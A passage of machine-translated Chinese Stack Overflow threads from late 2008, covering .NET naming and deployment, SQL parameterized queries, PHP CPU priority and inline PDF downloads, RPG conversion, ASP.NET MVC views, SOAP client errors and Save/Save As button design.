**实体层**
YourCompany.Data.Entities.dll

**业务层**
YourCompany.BusinessLogic.Name.dll *（例如：YourCompany.Accounting.Services.dll）*

这也不是黄金，我相信还有很多其他类型的方法可以做到这一点，我们这样做是为了更容易找到项目、程序集和构建正确的部署。另外，在查看您的程序集时，查看全名而不是“MS.BLL.dll”要友好得多。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-19T19:00:08.787

项目组件的命名确实没有标准。重要的是选择一个适用于您的项目的约定，然后一致地应用它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T19:04:32.383

您可能会在此处获得有关构建包的一些想法：[Java 项目的包结构？](https://stackoverflow.com/questions/210567/package-structure-for-a-java-project)

至于方法、接口、变量等……给所有东西起一个名字，准确地描述它的作用或代表什么。每种语言都有不同的标准命名约定。你可能想用谷歌搜索你正在编程的语言。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-19T19:27:09.170

同意汤姆安德森的观点，你不必害怕打字。试图使一切尽可能短，比人们意识到的命名法更像是一个障碍，而命名法比人们意识到的更像是发展的障碍。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-01T00:11:45.967

嘿 %20，想在这里见到你 :) （假设你是 3dbuzz 的那个）

无论如何，使用命名空间和文件夹！如果不需要，不要对 DLL 感到疯狂。对于我假设您正在谈论的 DLL 的那种应用程序可能会有点矫枉过正。在 C# 中使用文件夹和命名空间。例如：

```
Library
 - Net code
 - DBA code
 - Controller manager code
 - Factories
Application
 - Forms
 - Controllers
 - Models
  - Helpers 
```

在 C++ 中，我通常：

```
Library
 - Net Code
  - Header Files
  - Source Files
  - Inline/template files
 - DBA Code
  - Header Files
  - Source Files
  - Inline/template files
Application
 -Model
  - Header Files
... and so on 
```

在 PHP 中，没有名称空间会更难。但我仍然遵循与 C# 中相同的文件夹结构，但我命名我的类以弥补没有命名空间。例如，如果在 C# 中我在 Application.Controllers.Course 命名空间下有一个名为“Index”的类，那么在 PHP 中我会调用它：

```
Application_Controllers_Course_Index 
```

无论如何，请不要在没有必要的情况下使 DLL 变得疯狂。我无法忍受看到具有超过 5 个 DLL 的应用程序，这些 DLL 除了在主 EXE 之外从未在其他地方使用过。

# .net - .Net 3.5 SP1 正式更新推出？

> ID：381866
> 
> 赞同：0
> 
> 时间：2008-12-19T18:58:07.763
> 
> 标签：.net, .net-3.5, deployment

据我所知和谷歌搜索技巧，.Net 3.5 SP1 仍然不是“官方”版本。这是获得 SP1 升级的唯一方法是自愿下载，而不是通过强制 Windows 更新。

.Net 3.5 SP1 何时推送给所有 Windows 用户是否有任何时间框架？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T19:04:08.483

Scott Hanselman 写了一篇关于这个的文章：

[http://www.hanselman.com/blog/NET35SP1GDRIsAvailableToDownload.aspx](http://www.hanselman.com/blog/NET35SP1GDRIsAvailableToDownload.aspx)

*“截至今天，我们仍有望在 2009 年第一季度推出基于 Windows 更新的 3.5 SP1”*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-12T13:45:47.003

跟进：更新在 Windows Update 中可用，它显示为“Microsoft .NET Framework 3.5 SP1 Family Update”或类似的。

# linq - 使用 LinqDataSource 重新绑定 GridView

> ID：381873
> 
> 赞同：1
> 
> 时间：2008-12-19T18:59:33.860
> 
> 标签：linq, gridview, linqdatasource

我有一个使用 LinqDataSource 作为数据源的 gridview。我添加了一个 FooterTemplate，以便用户可以插入新记录。Add Button 有一个命令名称，它将值放入 Dictionary 列表中，然后调用 LinqDataSource.Insert() 方法。这工作正常。但是 gridview 永远不会使用新行自动刷新。我正在使用 LinqDataSource.Selecting 事件来初始绑定数据。我已经尝试过 LinqDataSource.Bind() 和 GridView.Bind() 但 gridview 永远不会刷新。知道如何让 GridView 重新绑定吗？

注意：我没有使用 UpdateDate 面板，简单的回发/刷新没有 ajax

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-19T19:50:49.123

一旦可行的解决方案是：

*   添加逻辑以在 CodeBehind 中为 GridView 定义 DataSourceID
*   在 Insert() 方法之后调用函数

# c# - 将 MySQL .DMP 文件转换为 MS Sql Server 2005 的 .SQL 文件

> ID：381874
> 
> 赞同：0
> 
> 时间：2008-12-19T18:59:40.067
> 
> 标签：c#, .net, mysql, sql-server, regex

我在一个需要将 MySQL *.dmp 文件中的数据重复导入现有 Sql Server 数据库的项目中处于第一状态。我正在寻找现有工具、框架形式的指导，或者，除非已有解决方案，否则，我正在寻找有关如何进行的建议。

我的第一个想法是以文本形式读取 dmp 文件并对其执行某种查找/替换以将 MySQL 约定转换为 SQl 服务器，但这听起来很混乱、困难且容易出错，因为意外项目会潜入源文件。

此外，这些 dmp 文件是累积的。我在哪里可以找到用于计算数据和模式中的表增量的资源？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T19:12:26.470

我认为您应该将所有这些数据加载到新的 MySQL 安装中，然后使用 SQL Server Integration Services 将这些数据导入 SQL Server。

另外要迁移数据库结构，您可以查看此文档： [SQL Server White Papers: Migration from MySQL, Oracle, Sybase, or Microsoft Access to Microsoft SQL Server](http://www.microsoft.com/downloads/details.aspx?familyid=3f0f2a3f-dff9-49cd-8ea7-581aa7a303a4&displaylang=en)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T19:11:59.480

我将数据库结构从一个数据库引擎转换为另一个的首选方法包括为此目的创建一个简单的应用程序，特别是如果它必须是动态的（结构随着时间而变化）并且重复。在你的情况下这可行吗？

具体来说，编写一个应用程序/脚本来遍历源数据库（本例中为 MySQL）的结构，并为目标数据库（本例中为 SQL Server）生成等效的 DDL。然后可以将 DDL 保存为稍后执行的脚本，或者如果您可以选择同时连接到两个数据库，它可以实时执行。

多年来，我在各种情况下都这样做了很多次。它本质上是一般情况下的代码生成练习，因此可以从使用模板引擎 (StringTemplate) 中受益。

我发现这对于升级数据库（Oracle 6 到 7）以及切换产品（如 Access to SQL Server）的情况很有用。

您也可以考虑改为以 ANSI SQL 为目标，这将适用于大多数数据库，除非您使用自定义数据库功能（应保持在最低限度）。

最好的祝愿。

编辑：我不建议尝试通过某种文本解析和重写来转换实际的脚本文件。我发现它容易出错、极其困难、耗时，并且最终因某些必要的转换而失败。正如我上面建议的那样，让数据库引擎为您完成这项工作。

# php - 如何使 php 对 CPU 更好？

> ID：381885
> 
> 赞同：2
> 
> 时间：2008-12-19T19:04:57.343
> 
> 标签：php, nice

我在一个共享的 *NIX 服务器上运行（由 Site5 运行）。我有一个在后台运行的 php 脚本，偶尔会进行一些离线计算。它在运行时使用大约 100% 的 CPU。我试过很好，像这样：

```
nice -n 19 php script.php 
```

但这似乎没有任何区别。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-12-19T19:09:20.517

您可以通过代码分散 usleep ( int $micro_seconds )。这将迫使您的脚本停止一小段时间，让 CPU 腾出时间来做其他事情。

那有必要吗？如果您的脚本具有低优先级，那么它使用 100% 的 CPU 是否重要...如果其他具有更高优先级的进程需要 CPU，他们不会得到他们需要的时间，而您的脚本会得到其余的（最多100%）？

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-19T19:09:04.683

即使很好，它也会使用 100% 的 CPU（如果可用）。但是，内核将优先考虑出现的任何其他（非优先）进程。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-12-19T19:40:39.690

只要系统响应迅速，并且您能够在它运行时完成其他工作，我就不会担心。我在我的系统上运行一个[分布式计算客户端](http://www.distributed.net)，它会占用所有可用的 CPU 周期。由于它以最低优先级运行，因此任何和所有其他进程都会根据需要抢占它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-19T20:39:34.920

由于您的进程是后台进程，并且使用 100% CPU，因此该进程似乎受 CPU 限制。它是后台，因此不会预期用户绑定，因此唯一的选择是 IO 绑定。如果您的进程不应该真正进行有趣的 IO，则脚本本身将受 CPU 限制，而不仅仅是错误。

流程总是会尽可能快地进行。如果他们是 IO bound，他们将使用 100% IO，如果他们是 CPU bound，他们将尝试使用 100% CPU。正确编写的进程调度程序自动旨在为所有进程提供公平感，这意味着较大的进程获得较低的优先级。您可以使用 nice 进一步降低优先级。CPU 使用率仍然约为 100% 的事实意味着当前没有其他进程受 CPU 限制，但很可能正在等待来自网络的输入。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-19T21:38:17.720

如果有相当多的上下文切换进程，而不是多少，很好地改变了你的 php 导致 100% CPU 的频率。

程序执行系统调用的那一刻，内核可以在执行实际工作之前将 CPU 让给另一个进程。您的 php 在全速运行时似乎没有进行任何系统调用。也就是说，您没有进行任何阻塞 I/O（套接字、文件等）。查看是否有任何代码块卡在忙等待中。

# asp.net - 插入参数化查询 ASP.NET MS SQL

> ID：381889
> 
> 赞同：1
> 
> 时间：2008-12-19T19:07:15.747
> 
> 标签：asp.net, sql-server

这是我的 SQLCommand 对象：

```
oCommand.CommandText = 
"INSERT INTO hits (id,client_id,client_ip,page,vars) VALUES _
                     (@@IDENTITY,@client_id,@ip,@page,@vars)"
oCommand.Parameters.Count = 4
 >>   oCommand.Parameters.Item(0).ParameterName = "@client_id"
 >>   oCommand.Parameters.Item(0).Value = "123456"
 >>   oCommand.Parameters.Item(1).ParameterName = "@ip"
 >>   oCommand.Parameters.Item(1).Value = "127.0.0.1"
 >>   oCommand.Parameters.Item(2).ParameterName = "@page"
 >>   oCommand.Parameters.Item(2).Value = "default.aspx"
 >>   oCommand.Parameters.Item(3).ParameterName = "@vars"
 >>   oCommand.Parameters.Item(3).Value = Nothing 
```

这是我得到的错误：

" `The parameterized query '(@ip nvarchar(9),@client_id nvarchar(4000),@page nvarchar(12),@v' expects the parameter '@client_id', which was not supplied.`"

以下是功能：

```
Public Shared Function insertIntoHitTable(ByVal oData As gsTrack) As Boolean
    Dim oObj As New List(Of Object())
    oObj.Add(New Object() {"@client_id", cV(oData.ClientID)})
    oObj.Add(New Object() {"@ip", cV(oData.IP)})
    oObj.Add(New Object() {"@page", cV(oData.Page)})
    oObj.Add(New Object() {"@vars", oData.Vars})
    Dim oCommand As SqlCommand = InsertIntoHitTableSQL(oObj)
    oCommand.Connection.Open()
    oCommand.ExecuteNonQuery()
    oCommand.Connection.Close()
End Function

Public Shared Function createSQLCommand(ByVal oCmdTxt As String, ByVal oParams As List(Of Object())) As SqlCommand
    Dim oCommand As SqlCommand = Nothing
    Dim oBuilder As New StringBuilder
    Dim oParam As SqlParameter
    oCommand = New SqlCommand(oCmdTxt, New SqlConnection(csString))
    Try
        For i As Integer = 0 To oParams.Count - 1
            oParam = New SqlParameter
            oParam.ParameterName = oParams(i)(0)
            oParam.Value = oParams(i)(1)
            oCommand.Parameters.Add(oParam)
            oParam = Nothing
        Next
        Return oCommand
    Catch ex As Exception
        Return Nothing
    End Try
End Function 
```

有关如何解决此参数化查询错误的任何指示？谢谢！

## 编辑

我应该注意到 cV() 只是一个清理函数，它检查传递的变量是否为空。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T19:15:16.557

我相信参数计数和索引会稍微偏移，因为您在插入语句中指定了@@IDENTIDY。在进行参数化查询时，我通常遵循以下语法：

```
oCommand = New SqlCommand("INSERT INTO hits (id,client_id,client_ip,page,vars) VALUES (@@IDENTITY,@client_id,@ip,@page,@vars)", CONNECTION OBJECT)

oCommand.CommandType = CommandType.StoredProcedure
oCommand.Parameters.Add("@client_id", SqlDbType.Integer, 10)
oCommand.Parameters("@client_id").Direction = ParameterDirection.Input
oCommand.Parameters("@client_id").Value = cV(oData.ClientID)
oCommand.Parameters.Add("@ip", SqlDbType.VarChar, 15)
oCommand.Parameters("@ip").Direction = ParameterDirection.Input
oCommand.Parameters("@ip").Value = cV(oData.IP)

oCommand.Connection.Open()
oCommand.ExecuteNonQuery()
oCommand.Connection.Close() 
```

...您可以看到其余参数将如何遵循。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T19:15:13.110

在 CV 函数中，您是否正在检查该值是否为空？我看到的[网站之一](http://www.sitepoint.com/forums/showthread.php?t=487633)是您需要传递 DBNull.value 而不是 null 的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-22T20:18:11.110

你永远不应该使用@@identity。如果该列是一个标识，只需不要在值列表中指定它。如果您在任何地方使用它来获取刚刚插入的值，则使用 scope_identity() 代替，除非您喜欢数据完整性问题。

# security - 使用正确的文件名在浏览器中安全下载文件

> ID：381890
> 
> 赞同：4
> 
> 时间：2008-12-19T19:07:16.137
> 
> 标签：security, file, browser, download, inline

我正在一个网站上做一些工作，该网站有一个安全区域，只有在用户登录后才可供用户使用。在这个区域有一个页面，其中包含可以下载的 pdf 文档的链接。物理文档位于网站的根目录之外。pdf 文档的链接如下所示：

index.php?page=secure-area/download&file=protected.pdf

它执行以下操作（注意：我知道这是强制下载而不是在浏览器中打开文件的方法*）*：

```
// check security, get filename from request, prefix document download directory and check for file existance then...

header('Content-Type: application/pdf');
header('Content-Disposition: attachment; filename="' . basename($file) . '"');
header('Content-Transfer-Encoding: binary');
header('Content-Length: ' . filesize($file));
header('Connection: Close');
set_time_limit(0);
readfile($file); 
```

这很好用，但在 Firefox 3 和 Internet Explorer 7（我没有用任何其他浏览器测试过）不会在浏览器中打开这个文件，它们都显示下载对话框（如预期的那样）。如果我选择打开而不是保存，则会下载文档并在浏览器之外启动 Adob​​e Reader 以呈现文档。

**我遇到的问题是在浏览器中下载文件并在保存时具有正确的默认文件名。**

我希望文档在浏览器中打开。一种方法是使用标题“Content-Disposition: inline;” 但这意味着我无法指定文件名（因为似乎被浏览器忽略了）。这样做的问题是当我保存文档时，默认名称是 URL 的名称，而不是 pdf 文档的文件名：

```
http___example.com_index.php_page=secure_area_download&file=protected.pdf 
```

如何让 Firefox 和 Internet Explorer 在浏览器中打开文档并提供正确的默认文件名进行保存？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-24T01:10:22.843

我终于想出了解决这个问题的方法。

尽管 RFC 2183 显示文件名参数可用于 Content-Disposition 标头字段的附件和内联，但似乎浏览器在使用内联时会忽略文件名参数，而是尝试确定文件名应基于什么网址。如果 URL 没有查询字符串，则 URL 中最后一个 / 之后的部分似乎用作文件名。

我已更改下载受保护 PDF 文档的链接，以使用不包含查询字符串的好 URL，并使用带有 .htaccess 文件的 mod_rewrite 来转换这些好 URL，以使用正确的参数执行正确的脚本：

旧链接：

```
index.php?page=secure-area/download&file=document.pdf 
```

新链接：

```
file/secure-area/download/document.pdf 
```

.ht 访问：

```
RewriteEngine On
RewriteRule ^file/secure-area/download/(.*)$ index.php?page=secure-area/download&file=$1 [L] 
```

用于实际发送文件的脚本与我之前使用的脚本相同（注意问题中的示例使用 Content-Disposition: attachment 而不是 Content-Disposition: inline 来演示浏览器在**未**内联时使用正确的文件名保存文档）。

```
// check security, get filename from request, prefix document download directory and check for file existance then...
header('Content-Type: application/pdf');
header('Content-Disposition: inline; filename="' . basename($file) . '"');
header('Content-Transfer-Encoding: binary');
header('Content-Length: ' . filesize($file));
header('Connection: Close');
set_time_limit(0);
readfile($file); 
```

现在 PDF 文档在浏览器中打开，保存时默认文件名是

```
document.pdf 
```

并不是

```
http___example.com_index.php_page=secure_area_download&file=document.pdf 
```

IE 7 在保存时将文件名中的空格转换为 + 并将单引号转换为 %27（Firefox 不会），我想阻止这种情况发生，但同时我对我所拥有的感到满意。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T19:24:11.687

尝试使用

```
Content-Disposition: inline; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-19T15:28:58.933

不，她的意思是在使用“Content-disposition:inline”时无法指定文件名。'Filename' 仅在使用 'Content-disposition:attachment' 时使用，如在她的第一个示例中。这会导致使用正确的文件名下载文档。然而，这个解决方案试图实现的是一个呈现为内联的文档，当从浏览器下载时使用正确的文件名，而不是脚本名。

使用'inline'时，除了url重写之外，还有其他方法可以指定文件名吗？我为呈现文档而编写的页面需要一个数据库 ID，因此我认为重写会更加困难（必须从数据库中查询文件名）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-10-07T10:31:16.053

`Content-disposition:inline`可以与文件名一起使用。但只有一些浏览器理解并遵循这一点。只有当您自己保存文件名时才能看到效果，将使用您使用内容配置定义的文件名。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-12-19T19:24:57.567

您通过使用 Content-disposition: attachment 来告诉它这样做。尝试使用 Content-disposition: inline。

# ibm-midrange - 对于 RPG36 代码转换，您会推荐哪些资源？

> ID：381891
> 
> 赞同：0
> 
> 时间：2008-12-19T19:08:39.927
> 
> 标签：ibm-midrange, rpgle

这个问题真的问了一切。我们有一堆非常古老的 S/36 程序需要进行现代化改造。我更多的是寻找解释旧方法的作用以及如何将其转换为 RPGLE 的文章或网站。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-06-29T22:19:32.210

RPG II 和 RPG III 在句法上没有区别。实际上，您只需将属性从 RPG36 更改为 RPG，它就会“升级”。然后，您可以通过 CVTRPGSRC 运行这个新成员，并从中获取（通常）可用的 RPGLE 程序。

另一方面，S/36 程序并不那么容易转换。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-22T19:21:33.470

[这是 AS400 上的 RPG II 手册](http://publib.boulder.ibm.com/iseries/v5r1/ic2924/books/c0918180.pdf)，因此您可以理解旧代码。

您可以尝试使用 CRTRPGPGM 将代码编译为 RPGIII。修复列表中的编译错误以将代码转换为 RPG III。

获得 RPG III 源后，您可以继续使用 CVRPGSRC 命令将其进一步转换为 RPG ILE。

也可以将 RPG36 代码直接带入 CVTRPGSRC 以将源代码转换为 RPG ILE。

# asp.net-mvc - ASP.NET MVC 让我想起了旧的经典 ASP 意大利面条代码

> ID：381895
> 
> 赞同：26
> 
> 时间：2008-12-19T19:09:39.800
> 
> 标签：asp.net-mvc, view, coding-style, asp-classic

在查看了这个站点一段时间后，我刚刚浏览了一些 MVC 教程。只是我，还是 MVC 视图页面带回了经典 ASP 意大利面条代码的可怕闪回，所有的 HTML 和 ASP.NET 跳进跳出，到处都有黄色分隔符，无法阅读？代码/设计分离的重要性发生了什么变化？在教程出现在查看页面开发部分之前，我真的被新技术所吸引。

还是我错过了什么？（并且不要说您可以使用模板来提供帮助，因为它只是将意大利面移动到另一个位置 - 将它扫到地毯下 - 它不能解决问题）

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-12-19T19:14:21.503

请参阅 Jeff 的帖子（[http://www.codinghorror.com/blog/archives/001155.html](http://www.codinghorror.com/blog/archives/001155.html)），它回应了您的问题，以及 Rob Conery 的回复（[http://blog.wekeroad.com/blog/asp-net-mvc-避免标签汤/](http://blog.wekeroad.com/blog/asp-net-mvc-avoiding-tag-soup/)）

总而言之，ASP.NET MVC 为开发人员提供了选择自取其辱的选择，尽管它当然可以干净利落地完成。因此，它适合于对 Web 开发感到满意并拥有简洁风格的开发人员，但它不适合那些希望在不深入研究标记的情况下获得 Widgetized 行为的开发人员。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-12-19T20:27:52.013

如果您不喜欢默认的 View 引擎，可以使用另一个。

根据[Scott Guthrie 的博客](http://weblogs.asp.net/scottgu/archive/2008/12/19/asp-net-mvc-design-gallery-and-upcoming-view-improvements-with-the-asp-net-mvc-release-candidate.aspx#6797833)：

> 团队使用 ASP.NET MVC 所做的其中一件事是确保您可以使用任何类型的“视图引擎”。这提供了很大的灵活性，可以根据需要自定义渲染引擎。
> 
> 我们将在未来研究一些更具声明性的视图引擎——尽管目前还没有具体计划。

替代视图引擎的示例是这里讨论的[NHaml 、](http://code.google.com/p/nhaml/downloads/list)[这里](http://andrewpeters.net/2007/12/19/introducing-nhaml-an-aspnet-mvc-view-engine/)讨论的[Spark](http://dev.dejardin.org/)和[这里](http://haacked.com/archive/2008/12/08/asp.net-mvc-northwind-demo-using-the-spark-view-engine.aspx)讨论[的](http://www.chadmyers.com/Blog/archive/2007/11/28/testing-scottgu-alternate-view-engines-with-asp.net-mvc-nvelocity.aspx)[NVelocity](http://nvelocity.sourceforge.net/)。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-03-13T17:24:27.770

Finlay Microsoft 正在通过 ASP-Classic 到 ASP.NET 步骤来纠正他的错误。70% 的老 ASP 程序员选择 PHP，因为 ASP.NET 太复杂了。

他们坚持认为一切都可以通过 ASP.NET 药物和下拉菜单来解决。最后一切都在**表单**标签内！我们正在构建大型“网络表单”而不是网站。只需查看来自任何 ASP.NET 站点的 HTML。绝对可怕！

ASP.NET MVC 是更干净、更有条理的 HTML 代码和强大的业务逻辑的新希望。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2008-12-19T20:34:43.933

MVC 与通用 ASP.NET 的区别就像自动和手动传输之间的区别。如果您想确定为何种目的使用哪个档位、何时换档并优化效率，请使用手册。如果您想要一些可以正常工作但可能没有得到很好优化、灵活或易于调试的东西（您不需要经常这样做），请使用自动。

经典的 ASP 是只有二档的手动变速器。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-12-19T19:15:18.647

不同之处在于，在 MVC 中，视图唯一要做的就是渲染显示。所有的业务逻辑、I/O 处理和模型相关的代码都可以在控制器和模型类中找到。视图中的代码量相对较小且紧凑——如果常用的话，您可以将其抽象为用户控件（部分视图）。

就个人而言，我喜欢我对视图的额外控制。我在 webforms 上的大部分时间似乎都花在试图解决所做的默认假设（以及主/子页面引入的名称修改），这使得在客户端做任何事情都变得困难。

**编辑**：我忘了提到创建 HtmlHelper 扩展方法的能力，它可以让你将很多东西也移动到后端。总而言之，在控制器、模型和扩展方法之间，它增加了更多代码，这些代码在 MVC 中很容易在经典 ASP 或 ASP.NET WebForms 中测试。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-12-20T02:25:05.770

我认为 ASP.NET 视图引擎的问题在于你可以做什么没有限制，因为它只是嵌入在 XHTML 中的一种 .NET 语言。

相比之下，看看[Django 模板引擎](http://docs.djangoproject.com/en/dev/topics/templates/)。在 Django 框架中，控制器和模型是使用成熟的 Python 语言编写的，但是视图模板引擎定义了一种**受限语言**，它只提供基本的编程结构（条件、循环等）。这种受限制的语言类似于 Python，但实际上并不是 Python，因此它不能像外部库那样调用任意代码。它只能访问传入视图的模型数据。

任何嵌入通用语言的视图引擎都会遇到人们滥用它并做他们不应该在视图中做的事情的问题。因此，对于这些引擎，您确实需要尽职尽责地限制自己做除了访问模型数据之外的事情。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-10-27T09:08:41.527

在对 MVC 进行了一段时间的编程之后，我将回到 ASP.NET。

MVC 确实是从经典的 ASP 或 PHP 向前迈出的一大步，但与 ASP.NET 相比，它是一个很大的倒退。

许多可以在 ASP.NET 中通过几个步骤进行编程的东西在 MVC 中需要做更多的工作。更难按时完成。

该技术有其优点，但还不成熟。

也许在 3.0 版本中......

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-12-19T19:16:56.257

这是在 PDC 上提到的，他们确实提到它有点过于“经典 asp”，就像所有 <%=. 但他们也确实提到他们将添加标准的 ASP.Net 标记和控件。

他们的整个方向是获得稳定的版本，然后使其更易于使用。

PDC 视频： http: [//mschnlnine.vo.llnwd.net/d1/pdc08/WMV-HQ/PC21.wmv](http://mschnlnine.vo.llnwd.net/d1/pdc08/WMV-HQ/PC21.wmv)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-12-19T19:21:36.593

这是关于关注点的分离。在 Classic ASP 中，它是业务逻辑和表示逻辑的混合体，其中包含令人讨厌的库。

在这一点上的语法是相似的，但目的不是。在视图中，您应该只做表示逻辑。您仍然可以将业务逻辑放在那里，没有什么能阻止您（不幸的是）。这取决于开发人员，这仍然是我最关心的问题。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-04-04T02:11:10.113

查看[StringTemplate](http://code.google.com/p/string-template-view-engine-mvc/)视图引擎，它看起来很干净。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2011-02-09T04:56:08.923

我总是对一些最强烈的 asp.net mvc 支持者所展示的对 n 层/层设计缺乏理解感到惊讶。SOC 在网络表单中一直是可以实现的。像 MVP 这样的 UI 模式在 Web 表单中总是可以实现的。这么多开发人员不知道如何设计，这不是平台的错。

回到意大利面的问题，我不得不同意。如果视图包含条件逻辑或大量不可测试的代码片段，则视图不会像它应该的那样“愚蠢”。

就个人而言，我更喜欢 MVP 模式而不是 MVC 模式。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-10-13T21:19:40.470

因为 MVC 背后的人真的很喜欢 ASP/JSP 页面并且想要重新实现它。他们似乎讨厌：

*   视图状态
*   现有的 ASP.Net 控件
*   干净的 HTML
*   现有用户控件
*   回发

他们似乎喜欢：

*   重新发明轮子
*   REST-ful url

MVC 本质上是一种强制将代码与表示分离的方法。如果开发人员真的足够关心，这可以通过普通的 Asp.Net 轻松实现。无论如何，有可能朋克整个“分离”系统，所以我真的不明白这一点。

话虽如此，它有一些优点..但不足以超过问题。MVC 版本 3 我肯定会很棒。

在有人给我打分 -1 之前，看看我回答了多少 MVC 问题。我知道我在说什么。

**更新** 如果您认真对待您的分离，那么在查看它时，chaiguy1337 是一件好事。 [字符串模板看起来很棒](http://code.google.com/p/string-template-view-engine-mvc/)，因为它不允许在您的前端使用任何代码！在我看来，ASP.net MVC 团队在 MVC 上丢了球。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-10-14T20:57:46.547

在经典 ASP 中，您无法将业务逻辑移出 UI 层。在 ASP.Net MVC 中，“意大利面条”代码被隔离在 UI 层，即 View；90% 的逻辑将位于“M”和“C”层，它们是常规的、非意大利面的 C# 类。

视图意味着“愚蠢”。从业务逻辑的角度来看，没有什么重要的。它意味着几乎是一次性的。

您可以乱涂乱画房间而不会损坏结构。如果您决定清理并重新粉刷，则无需致电建筑师。与视图相同。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2011-01-31T15:25:17.527

作为记录 ：

我认为 ASP MVC 的*真正*问题是控制器，使用（或模拟）某些模板方案（即使在 ASP 经典中）是微不足道的（在大多数语言中），并且任何语言都可以做模型（有或没有对象）但 MVC迫使您将控制器与视图和模型分开，从而使过程中的代码膨胀。

一个常见的网站依赖于 full-form-post/get 和 AJAX，如果您同时使用两者，那么您会将 MVC 中的“C”变成一团糟。

最终，大多数程序员结束“作弊”，将 ajax 调用放在 VIEW 层。

# php - (PHP) 类 SoapClient 的对象无法转换为字符串

> ID：381898
> 
> 赞同：1
> 
> 时间：2008-12-19T19:10:32.620
> 
> 标签：php, arrays, types, soap-client

此代码工作正常：

```
 $result = $client->__call("optionalInfo", array(
    new SoapParam("...", "client"),
    new SoapParam("...", "add_code"))
); 
```

当我尝试对其进行抽象以使脚本可重用时，我收到此错误：

可捕获的致命错误：SoapClient 类的对象无法转换为字符串

损坏的代码是：

```
 $params = array( new SoapParam($client, "client"),
             new SoapParam($add_code, "add_code")
);
$result = $client->__call($functionName, $params); 
```

最后一行是导致问题的原因。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T20:24:47.883

您确定要将 SoapClient 接口作为参数发送到对同一对象的函数调用吗？

```
new SoapParam($client, "client") 
```

# user-interface - GUI设计：合并“保存”和“另存为”

> ID：381909
> 
> 赞同：0
> 
> 时间：2008-12-19T19:14:38.323
> 
> 标签：user-interface, save, save-as

我正在开发一个 GUI（OpenG Builder）。如何将“保存”和“另存为”按钮合并为一个按钮？

我的想法转到按钮右侧的“另存为”的“热点”，由字形表示。

如何以直观的方式实现此功能（GUI 屏幕截图、提示）？

我不是在寻找 ActiveX/.Net 实现。描述或屏幕截图就足够了。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-19T19:19:10.497

带有下拉菜单的保存按钮怎么样，类似于旧的返回按钮在网络浏览器中的工作方式，您可以单击返回返回一页，或单击箭头返回多个页面. 单击“保存”按钮只会保存，而单击箭头会显示选项（保存、另存为等）。

我对合并这些功能的担忧是 Save 是一个（潜在的）破坏性操作，而另存为是一个（潜在的）非破坏性操作。如果用户在尝试执行非破坏性操作时不小心单击了错误的位置并执行了破坏性操作，那将是一件坏事。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-19T19:48:38.347

我认为这是倒退。“保存”是一个频繁的操作，对于正常的工作流程是绝对必要的。访问“保存”应该尽可能简单。另一方面，另存为很少使用，并且需要额外的用户交互。

将 Save 和 Save As 结合起来是一种吸引我们程序员的解决方案——合乎逻辑、干净，而且一点也不友好。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-12-19T19:28:26.703

如果您可以控制自己的文件格式，那么只需在文件中存储修订，因此不需要另存为。如果您保持修订，保存永远不会破坏您的任何工作。

完成后，您可以一起删除“保存”按钮并定期为用户执行此操作。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-12-19T19:40:59.547

我同意其他海报的观点，总体而言这不是一个好主意。但是，如果您必须这样做，我认为最简单的方法就是让“保存”按钮始终充当“另存为...”按钮（即始终打开“文件”对话框）。该对话框应默认为上次保存的文件和位置，因此要进行普通保存，只需单击“保存”按钮，然后单击“确定”，然后对“您要覆盖...”问题选择“是”。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-19T19:29:57.260

斯科特基本上发布了我要说的内容，所以我将添加一个相关的观察。IrfanView 是流行的 Windows 图像查看器，它努力使保存比另存为更难。带有通用保存图标的工具栏按钮实际上执行另存为。工具栏甚至没有执行标准保存的按钮。

我认为作者是这样设计的，因为在可能有损格式的图像上保存可能具有破坏性。照原样，该程序使用户更有可能调用另存为。有时它很烦人，当您确实想要保存时，但安全第一的方法在某些情况下帮助了我。

也就是说，请不要合并保存和另存为。如果有的话，它们需要尽可能清晰地区分，以防止代价高昂的误点击。

